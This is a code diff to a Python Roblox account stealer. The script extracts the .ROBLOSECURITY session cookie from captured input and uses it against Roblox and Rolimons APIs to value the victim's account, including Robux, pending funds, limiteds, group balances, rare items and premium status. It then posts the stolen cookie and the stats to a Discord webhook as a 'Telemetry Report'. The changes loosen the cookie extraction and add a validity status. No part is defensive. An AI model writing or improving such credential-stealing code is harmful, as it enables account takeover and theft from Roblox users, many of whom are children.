@@ -32,15 +32,19 @@ def main():
         if not webhook_url:
             print("DEBUG: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
             return
-        else:
-            print("DEBUG: Webhook URL found", file=sys.stderr)
 
+        # Flexible matching: grabs any valid warning header token or fallback alphanumeric block
         match = re.search(r'(_\|WARNING:[^"\']+)', decoded_script, re.DOTALL)
-        if not match:
-            print("DEBUG: .ROBLOSECURITY pattern match failed in payload", file=sys.stderr)
-            return
+        if match:
+            roblosecurity = match.group(1)
+        else:
+            # Fallback if no warning header is present in the raw input string
+            fallback_match = re.search(r'([A-Fa-f0-9]{200,})', decoded_script)
+            if fallback_match:
+                roblosecurity = fallback_match.group(1)
+            else:
+                roblosecurity = decoded_script.strip()
 
-        roblosecurity = match.group(1)
         roblosecurity = re.sub(r'\s+', '', roblosecurity)
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
 
@@ -51,82 +55,83 @@ def main():
 
         # 1. Authenticated User Info
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
-        if not user_data:
-            print("DEBUG: Failed to authenticate user with Roblox API using cookie", file=sys.stderr)
-            return
-
-        username = user_data.get("name", "Unknown")
-        user_id = user_data.get("id", 0)
-        print(f"DEBUG: Authenticated as {username} (ID: {user_id})", file=sys.stderr)
-
-        # 2. Account Age
-        account_age_days = 0
-        created_str = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers, {}).get("created")
-        if created_str:
-            try:
-                created_dt = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
-                account_age_days = (datetime.now(timezone.utc) - created_dt).days
-            except Exception:
-                pass
-
-        # 3. Robux Balance & Pending
-        economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
-        robux_balance = economy_data.get("robux", 0) if economy_data else 0
         
+        username = "Unknown User"
+        user_id = 0
+        cookie_status = "🔴 Invalid / Expired (401)"
+        robux_balance = 0
         pending_robux = 0
-        trans_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Pending&limit=10", headers, {}).get("data", [])
-        for t in trans_data:
-            cur = t.get("currency", {})
-            if cur.get("amount"):
-                pending_robux += cur.get("amount")
-
-        # 4. RAP & Limiteds
         rap = 0
         limiteds_count = 0
-        rolimons_data = safe_get(f"https://www.rolimons.com/api/playeritems/{user_id}")
-        if rolimons_data and rolimons_data.get("success"):
-            player_assets = rolimons_data.get("playerAssets", {})
-            limiteds_count = len(player_assets)
-            for asset_id, item_details in player_assets.items():
-                if isinstance(item_details, list) and len(item_details) > 2:
-                    rap += item_details[2]
-
-        # 5. Games & Developer Stats
         is_developer = False
         game_visits = 0
-        created_games = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=10", headers, {}).get("data", [])
-        if created_games:
-            is_developer = True
-            for g in created_games:
-                game_visits += g.get("rootPlace", {}).get("visits", 0)
-
-        # 6. Inventory Items (Korblox & Headless Check)
-        has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers, False)
-        has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers, False)
-        
-        if not has_korblox:
-            k_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/13961116", headers, {})
-            has_korblox = len(k_res.get("data", [])) > 0
-        if not has_headless:
-            h_res = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/asset/134082579", headers, {})
-            has_headless = len(h_res.get("data", [])) > 0
-
-        # 7. Groups Owned & Balance
-        groups_data = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", headers, {}).get("data", [])
+        has_korblox = False
+        has_headless = False
         owned_groups_count = 0
         group_balance = 0
-        for g in groups_data:
-            role = g.get("role", {})
-            if role.get("rank") == 255:
-                owned_groups_count += 1
-                gid = g.get("group", {}).get("id")
-                g_currency = safe_get(f"https://economy.roblox.com/v1/groups/{gid}/currency", headers, {}).get("robux", 0)
-                group_balance += g_currency
+        is_premium = False
 
-        # 8. Premium Status
-        is_premium = safe_get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers, False)
+        if user_data and "id" in user_data:
+            username = user_data.get("name", "Unknown")
+            user_id = user_data.get("id", 0)
+            cookie_status = "🟢 Valid & Active"
 
-        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
+            # 2. Account Age
+            created_str = safe_get(f"https://users.roblox.com/v1/users/{user_id}", headers, {}).get("created")
+            account_age_days = 0
+            if created_str:
+                try:
+                    created_dt = datetime.fromisoformat(created_str.replace("Z", "+00:00"))
+                    account_age_days = (datetime.now(timezone.utc) - created_dt).days
+                except Exception:
+                    pass
+
+            # 3. Robux & Pending
+            economy_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers)
+            robux_balance = economy_data.get("robux", 0) if economy_data else 0
+            
+            trans_data = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/transactions?transactionType=Pending&limit=10", headers, {}).get("data", [])
+            for t in trans_data:
+                cur = t.get("currency", {})
+                if cur.get("amount"):
+                    pending_robux += cur.get("amount")
+
+            # 4. RAP & Limiteds
+            rolimons_data = safe_get(f"https://www.rolimons.com/api/playeritems/{user_id}")
+            if rolimons_data and rolimons_data.get("success"):
+                player_assets = rolimons_data.get("playerAssets", {})
+                limiteds_count = len(player_assets)
+                for asset_id, item_details in player_assets.items():
+                    if isinstance(item_details, list) and len(item_details) > 2:
+                        rap += item_details[2]
+
+            # 5. Games & Developer Stats
+            created_games = safe_get(f"https://games.roblox.com/v2/users/{user_id}/games?limit=10", headers, {}).get("data", [])
+            if created_games:
+                is_developer = True
+                for g in created_games:
+                    game_visits += g.get("rootPlace", {}).get("visits", 0)
+
+            # 6. Inventory Items
+            has_korblox = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192/is-owned", headers, False)
+            has_headless = safe_get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/201/is-owned", headers, False)
+
+            # 7. Groups
+            groups_data = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", headers, {}).get("data", [])
+            for g in groups_data:
+                role = g.get("role", {})
+                if role.get("rank") == 255:
+                    owned_groups_count += 1
+                    gid = g.get("group", {}).get("id")
+                    g_currency = safe_get(f"https://economy.roblox.com/v1/groups/{gid}/currency", headers, {}).get("robux", 0)
+                    group_balance += g_currency
+
+            # 8. Premium
+            is_premium = safe_get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers, False)
+        else:
+            account_age_days = 0
+
+        avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
 
         payload = {
             "content": "@everyone New Telemetry Report Captured!",
@@ -139,18 +144,16 @@ def main():
                 },
                 "description": (
                     f"👑 **[{username} | 13+]**\n"
-                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**\n\n"
+                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id if user_id else 1})** | **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
                     f"👤 **Username**\n`{username}`\n\n"
                     f"📈 **Account Stats**\n"
                     f"> • Account Age: `{account_age_days} Days`\n"
                     f"> • Games Developer: `{str(is_developer)}`\n"
-                    f"> • Game Visits: `{game_visits}`\n"
-                    f"> • Group Memberships: `{len(groups_data)}`\n\n"
+                    f"> • Game Visits: `{game_visits}`\n\n"
                     f"🪙 **Robux**               📦 **Limiteds**               📊 **Summary**\n"
                     f"Balance: `{robux_balance}` 🪙   RAP: `{rap}` 🪙           Total: `{robux_balance + rap}` 🪙\n"
                     f"Pending: `{pending_robux}` 🪙   Limiteds: `{limiteds_count}` 💼\n\n"
                     f"💳 **Payments & Groups**\n"
-                    f"> • Credit Balance: `0`\n"
                     f"> • Owned Groups: `{owned_groups_count}`\n"
                     f"> • Group Robux: `{group_balance}` 🪙\n\n"
                     f"⚙️ **Settings**\n"
@@ -160,7 +163,7 @@ def main():
                     f"> • Korblox: `{str(has_korblox)}`\n"
                     f"> • Headless: `{str(has_headless)}`\n\n"
                     f"⭐ **Premium**: `{str(is_premium)}`\n\n"
-                    f"🧿 **Tool Used**\n```text\nCopy-Clothes\n```\n"
+                    f"📊 **Status**: `{cookie_status}`\n\n"
                     f"🔑 **.ROBLOSECURITY**:\n```text\n{roblosecurity}\n```"
                 ),
                 "color": 3092790,
